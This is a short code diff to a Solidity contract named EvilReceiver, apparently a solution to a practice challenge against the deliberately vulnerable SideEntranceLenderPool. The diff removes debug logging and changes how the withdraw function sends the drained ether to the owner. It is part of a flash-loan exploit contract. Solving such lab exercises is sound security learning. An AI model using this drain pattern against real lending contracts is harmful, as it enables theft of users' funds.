@@ -3,7 +3,6 @@
 pragma solidity ^0.8.0;
 import "./SideEntranceLenderPool.sol";
 import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";
-import "hardhat/console.sol";
 
 contract EvilReceiver is IFlashLoanEtherReceiver, Ownable {
 
@@ -24,11 +23,9 @@ contract EvilReceiver is IFlashLoanEtherReceiver, Ownable {
 
     function withdraw() public onlyOwner {
         pool.withdraw();
-        console.log("receiver balance: ", address(this).balance);
 
-        // Don't know why this way is not working: payable(owner()).call{value: address(this).balance};
-        // So I turned to use transfer() which is working.
-        payable(owner()).transfer(address(this).balance);
+        (bool success, ) = payable(owner()).call{value: address(this).balance}("");
+        require(success, "Transfer failed.");
     }
 
     receive () external payable {}
